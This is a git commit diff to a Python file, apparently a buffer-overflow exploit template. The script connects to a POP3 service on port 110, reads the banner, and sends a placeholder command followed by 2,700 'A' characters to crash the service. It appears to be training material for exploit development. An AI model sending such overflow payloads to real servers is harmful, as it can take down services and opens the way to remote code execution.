b00aa06746dd46796ba343bd4f007b9570abc2f6
Tym Rabchuk <tymrabchuk@gmail.com>
2019-07-02 21:07:37 -0400

    Update starter.py

--- BO/templates/starter.py
+++ BO/templates/starter.py
@@ -10,6 +10,8 @@ RPORT = 110
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST,RPORT))
 
+data = s.recv(1024)
+
 #build a message
 
 buf = ""
@@ -17,7 +19,7 @@ buf += "A"*2700
 buf += "\n"
 
 #send the message
-s.send(buf)
+s.send("VALUE" + buf)
 
 #receive some data from socket
 data = s.recv(1024)
